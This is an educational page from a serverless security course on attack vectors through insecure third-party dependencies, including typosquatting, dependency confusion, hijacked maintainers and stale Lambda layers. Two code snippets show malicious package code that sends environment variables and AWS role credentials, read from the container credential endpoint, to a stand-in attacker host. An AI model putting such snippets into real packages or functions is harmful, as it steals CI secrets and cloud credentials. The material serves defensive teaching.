# SAS-6: Insecure Third-Party Dependencies - Attack Vectors

## Table of Contents
- [Understanding Dependency Attack Vectors](#understanding-dependency-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#common-attack-patterns)
- [Chaining with Over-Privileged Roles](#chaining-with-over-privileged-roles)

## Understanding Dependency Attack Vectors

> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in systems you own or are authorised to test.

Dependency attacks come in two shapes. In the **known-vulnerable** shape, the attacker does nothing to your supply chain—they simply notice that a library you already ship has a public advisory, and they send input that triggers it. In the **malicious-package** shape, the attacker gets their own code into your tree (typosquat, hijack, confusion) so that it runs the moment your function imports it. Both end in the same place: attacker-influenced code executing inside your function, with your function's identity.

The serverless amplifier is **ambient credentials**. Any code in the process can read the environment and the container credential endpoint, so the distance from "arbitrary code runs" to "the account's keys are exfiltrated" is a single line.

### Core Attack Flow

```
1. Get code into the function
   v
   Known CVE in a bundled dep, OR a malicious/typosquatted/hijacked package
2. Execute in the function's context
   v
   At import, via an install script, or when the vulnerable path is triggered
3. Harvest ambient credentials
   v
   Read env vars + the container credential endpoint -> role's temporary keys
4. Pivot / exfiltrate
   v
   Use the (often over-privileged) role to reach S3, DynamoDB, other roles
```

## Common Attack Patterns

### 1. Exploiting a Known CVE in a Bundled Dependency

The attacker fingerprints a library you ship (an error message, a response header, a behavioural quirk, or just a leaked bundle) and sends input that reaches the vulnerable code path.

```
# A function bundles a parser/deserializer with a public advisory.
# The attacker crafts an event that reaches the vulnerable code path:
POST /ingest
Content-Type: application/json

{ "payload": "<crafted input that triggers the known CVE>" }

# The library processes it and the attacker gains code execution
# INSIDE the function's process.
```

**Payoff**: remote code execution using nothing but a published advisory and your unpatched version. No supply-chain access required.

### 2. Typosquatting a Package Name

A developer (or a generated manifest) mistypes a name, and an attacker-owned lookalike is installed instead.

```
# Intended:
npm install cross-env
# Mistyped -> attacker's lookalike:
npm install crossenv        # ships credential-stealing code

# Python equivalents seen in the wild:
pip install reqeusts        # vs. requests
pip install python-sqlite   # vs. the stdlib / real packages
```

**Payoff**: attacker code enters the build and the artifact; it typically runs immediately via an install script and again at runtime.

### 3. Dependency Confusion (Internal Name on the Public Registry)

An attacker publishes a package with your *internal* package's name, at a higher version, on the public registry. A misconfigured resolver prefers the public copy.

```
# Your private package:
@myco/auth-utils   internal version 1.4.0

# Attacker publishes on the PUBLIC registry:
@myco/auth-utils   version 99.0.0   (malicious)

# A build that checks the public registry first pulls 99.0.0
# because it is "newer".
```

**Payoff**: the attacker's package is installed in place of your trusted internal one, executing on the build host and in the function.

### 4. Maintainer / Account Hijack of a Popular Package

The attacker takes over a legitimate package (phished credentials, an abandoned but still-depended-on library, a "helpful" new co-maintainer) and pushes a malicious release—often hidden in a fresh transitive dependency.

```
# You depend on "widely-used-lib" and never changed your range:
"widely-used-lib": "^2.0.0"

# The hijacked maintainer publishes 2.3.1, which adds a new transitive dep
# "innocuous-helper" that contains the payload.
# Your next `npm install` (no lockfile) silently pulls it in.
```

**Payoff**: a single upstream compromise propagates to every downstream function on the next unpinned install.

### 5. Malicious Install-Time Script (postinstall)

Package managers run lifecycle scripts during installation. Attacker code executes on the build/deploy host—before anything is deployed.

```
// attacker package.json
{
  "name": "helper-utils",
  "scripts": {
    "postinstall": "node ./harvest.js"   // runs on `npm install`
  }
}

// harvest.js (illustrative): exfiltrate whatever the CI host exposes
require('https').request('https://attacker.example/c', { method: 'POST' })
  .end(JSON.stringify(process.env));      // CI secrets, tokens, deploy creds
```

**Payoff**: compromise of the CI/CD pipeline and its secrets, and the ability to tamper with the artifact that gets deployed.

### 6. Runtime Credential Exfiltration from Inside the Function

Once a malicious module is imported, it reads the ambient credentials every serverless runtime exposes.

```
// Runs at import time inside the deployed Lambda:
const creds = {
  env: process.env,                         // AWS_SESSION_TOKEN, secrets, etc.
};
// The container credentials endpoint yields the role's temporary keys:
fetch(process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
      ? 'http://169.254.170.2' + process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
      : '...')
  .then(r => r.json())
  .then(k => fetch('https://attacker.example/x', {
      method: 'POST', body: JSON.stringify({ creds, keys: k }) }));
```

**Payoff**: the function's temporary role credentials and all its environment secrets land at the attacker's endpoint—no CVE needed, just presence in the tree.

### 7. Vulnerable Library Bundled in a Shared Lambda Layer

Layers are convenient and therefore stale. One vulnerable library in a shared layer exposes every function attached to it.

```
# Layer "common-deps:7" bundles an old serialization library with a CVE.
# 40 functions attach the layer:
functionA -> layer common-deps:7  (vulnerable)
functionB -> layer common-deps:7  (vulnerable)
...
# One exploit works against all of them; the layer is rarely rebuilt.
```

**Payoff**: fleet-wide exploitation from a single unscanned, stale artifact.

### 8. Outdated Runtime with Unpatched CVEs

A function pinned to a deprecated language runtime carries runtime-level vulnerabilities that will never be patched under it.

```
Runtime: nodejs14.x   # deprecated / end of support
Runtime: python3.7    # end of support
# Provider stops patching the runtime; every function on it inherits
# whatever CVEs exist at that level.
```

**Payoff**: durable, un-patchable exposure until the function is migrated to a supported runtime.

### 9. Trojanized Update to a Low-Attention Transitive Dep

The target is not the package you know, but a small utility three levels down that nobody watches.

```
your-app
  -> framework
      -> formatter
          -> tiny-string-util   <-- hijacked; new release adds payload
# You never named tiny-string-util; a floating range pulled the bad version.
```

**Payoff**: the deepest, least-audited node in the tree is the easiest to poison and the hardest to notice.

## Chaining with Over-Privileged Roles

A dependency compromise is only as damaging as the identity it inherits. In serverless that identity is the execution role, and the chain that turns a single bad package into an account breach is short:

```
Malicious transitive package imported in the function
        +
Function role has broad permissions (SAS-4: e.g. s3:*, iam:*, sts:AssumeRole)
        =
Package reads the role's temp keys at runtime
        -> lists and downloads S3 buckets
        -> scans DynamoDB tables
        -> assumes other roles and pivots across the account
```

Another common chain, starting at build time:

```
postinstall script runs in CI (malicious dep)
        -> steals the pipeline's deploy credentials from the environment
        -> those credentials can deploy/modify functions
        -> attacker backdoors the artifact for EVERY future deploy
```

The defensive lesson is that **SAS-6 and SAS-4 are multiplicative**: minimizing and scanning dependencies reduces the chance of a compromise; least-privilege roles and monitored egress reduce what a compromise can do.

## Key Takeaways

1. **Two ways in, one destination**—known CVEs and malicious packages both end in attacker code running with your function's identity.
2. **Transitive and install-time are the blind spots**—the code you never named, running before you even deploy, is where these attacks live.
3. **Credentials are ambient**—any imported module can read env vars and the container credential endpoint; RCE and exfiltration are one step apart.
4. **Layers and stale runtimes multiply exposure**—one vulnerable shared artifact exploits an entire fleet.
5. **Blast radius is set by the role**—chaining with SAS-4 turns a single bad dependency into full account compromise.

## Next Steps

- **[Prevention Guide](prevention.md)**: Inventory, scan, pin, minimize, and least-privilege
- **[Code Examples](examples.md)**: Vulnerable vs. secure package config, lockfiles, CI, and layers
- **[Serverless Learning Path](/learn/serverless)**: Continue the OWASP Serverless Top 10
- **[Practice](/practice)**: Apply what you've learned in hands-on exercises
